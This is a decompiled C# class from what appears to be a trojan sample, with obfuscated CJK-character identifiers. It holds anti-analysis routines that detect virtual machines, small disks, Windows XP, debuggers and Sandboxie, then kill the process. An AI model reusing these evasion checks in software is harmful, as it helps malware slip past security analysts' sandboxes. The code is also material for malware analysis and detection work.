// Decompiled with JetBrains decompiler
// Type: 片水冫臼隶夕厂乙几犬二色里.牙寸香方韭斗鳥龜自比歹谷彐
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace 片水冫臼隶夕厂乙几犬二色里
{
  internal class 牙寸香方韭斗鳥龜自比歹谷彐
  {
    public static void 勹牙艸夕鼎匚歹丨十疒匚力()
    {
      if (!牙寸香方韭斗鳥龜自比歹谷彐.厂弋父毋毋缶小口龍爻彳寸冖豸鬥() && !牙寸香方韭斗鳥龜自比歹谷彐.木屮貝釆彐鬲厶工巛彳尸() && !牙寸香方韭斗鳥龜自比歹谷彐.彐靑力气匕尸魚凵匚尸几大女止() && !牙寸香方韭斗鳥龜自比歹谷彐.工戶髟气戈牙赤臼鬥山犬子厂止() && !牙寸香方韭斗鳥龜自比歹谷彐.食支毋欠比豸尸冫彡土())
        return;
      Environment.FailFast((string) null);
    }

    private static bool 工戶髟气戈牙赤臼鬥山犬子厂止()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool 食支毋欠比豸尸冫彡土()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool 厂弋父毋毋缶小口龍爻彳寸冖豸鬥()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject["Manufacturer"].ToString().ToLower();
              if (lower == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL") || lower.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool 木屮貝釆彐鬲厶工巛彳尸()
    {
      bool 子干彳車月月火宀鹿示幺幺 = false;
      try
      {
        血片广小工爻卩文廴癶彳門廾.麻入支耳白米日邑网弓(Process.GetCurrentProcess().Handle, ref 子干彳車月月火宀鹿示幺幺);
        return 子干彳車月月火宀鹿示幺幺;
      }
      catch
      {
        return 子干彳車月月火宀鹿示幺幺;
      }
    }

    private static bool 彐靑力气匕尸魚凵匚尸几大女止()
    {
      try
      {
        return 血片广小工爻卩文廴癶彳門廾.豕凵亠缶金曰歹士老龍夕馬斗("SbieDll.dll").ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }
  }
}
